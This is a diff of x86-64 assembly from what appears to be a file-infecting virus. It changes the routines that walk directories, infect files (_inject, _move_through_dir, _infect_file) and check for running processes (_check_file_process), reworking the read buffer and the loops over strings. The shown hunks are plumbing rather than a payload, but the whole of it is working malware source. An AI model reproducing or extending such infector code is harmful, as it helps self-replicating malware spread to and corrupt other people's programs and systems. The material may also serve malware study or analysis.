@@ -99,15 +99,13 @@ _inject:
 	xor rcx, rcx; = 0
 	.loop_array_string:
 		add rdi, rcx
+		call _ft_strlen
+		push rax
+		pop rcx
 		call _move_through_dir
-		xor rcx, rcx; = 0
-		.next_string:; seek next dir
-			inc rcx
-			cmp byte[rdi + rcx], 0x0
-			jnz .next_string
-		inc rcx
-		cmp byte[rdi + rcx], 0x0
-		jnz .loop_array_string
+	inc rcx
+	cmp byte[rdi + rcx], 0x0
+	jnz .loop_array_string
 
 	_end:
 		xor rax, rax; = 0
@@ -186,9 +184,9 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 				inc rcx
 				cmp byte[rsi + rcx], 0x0
 				jnz .next_string
-			inc rcx
-			cmp byte[rsi + rcx], 0x0
-			jnz .loop_array_string
+		inc rcx
+		cmp byte[rsi + rcx], 0x0
+		jnz .loop_array_string
 
 		; concat_path
 			push rbx
@@ -506,90 +504,74 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r10
 ret
 
-_check_file_process:; (string rdi, stat rsi)
+_check_file_process:; (string rdi)
 	push r8
 	push r9
-	push r10
-	push r11
-	push r12
-	push r13
-	push rbx
 	push rcx
 	push rdx
-
 	push rsi
-	pop r12
-;	%ifdef DEBUG
-;		call _print; _print(rdi)
-;	%endif
+
+	sub rsp, 0x800; buffer to read
+
 	xor rsi, rsi; O_RDONLY
 	push 2
 	pop rax; open
 	syscall
+	push rdi
+	pop r8
 	push rax
-	pop r11; fd
-	xor rax, rax
-	cmp r11, 0x0
+	pop r9; fd
+	xor rax, rax ; read and 0 if can't open
+	cmp r9, 0x0
 	jl .return; jump lower
 
 	.loop_read:
-		sub rsp, 0x1000; TODO: loop read giga buffer ?
-
-		mov rdi, r11
+		mov rdi, r9
 		mov rsi, rsp
-		push 0x1000
+		push 0x800
 		pop rdx
-		xor rax, rax ; read
 		syscall
-		push rdi
-		pop r11
 
 		cmp rax, 0x0
 		je .close
 
-			mov r8, rax
-			mov r13, rsp
-			lea rsi, [rel process]
+			push rax
+			pop rsi
+			mov rsi, rax
+			lea rdi, [rel process]
 			xor rcx, rcx; = 0
 			.loop_array_string:
-				add rsi, rcx
+				add rdi, rcx
 				; check if it is in the file
-					push rsi
-					pop rdi
-					call _ft_strlen
-					cmp r8, rax
-					jl .close
-					push rax
-					pop rcx
-					push rdi
-					pop rdx
-					mov rdi, r13; mmaped region
-					mov rsi, r8; statbuf.st_size
-					call _ft_memmem
-					push rdx
-					pop rsi
-					cmp rax, 0x0
-					jne .close
+				call _ft_strlen
+				cmp rsi, rax
+				jl .close
+				push rax
+				pop rcx
+				push rdi
+				pop rdx
+				mov rdi, rsp; buffer
+				call _ft_memmem
+				cmp rax, 0x0
+				jne .close
+				push rsi
+				push rdi
+				pop rsi
+				push rdx
+				pop rdi
 				call _ft_strcmp
+				pop rsi
 				cmp rax, 0x0
 				je .close
-				xor rcx, rcx; = 0
-				.next_string:; seek next process
-					inc rcx
-					cmp byte[rsi + rcx], 0x0
-					jnz .next_string
-				inc rcx
-				cmp byte[rsi + rcx], 0x0
-				jnz .loop_array_string
+			inc rcx
+			cmp byte[rdi + rcx], 0x0
+			jnz .loop_array_string
 
 	xor rax, rax
-;		add rsp, 0x1000
-;		jmp .loop_read
 	.close:
 		push rax
 		pop rsi
-		add rsp, 0x1000
-		push r11
+		push r9
 		pop rdi
 		push 3
 		pop rax; close
@@ -597,16 +579,14 @@ _check_file_process:; (string rdi, stat rsi)
 		push rsi
 		pop rax
 	.return:
-		push r12
-		pop rsi
+		push r8
+		pop rdi
 
+	add rsp, 0x800
+
+	pop rsi
 	pop rdx
 	pop rcx
-	pop rbx
-	pop r13
-	pop r12
-	pop r11
-	pop r10
 	pop r9
 	pop r8
 ret
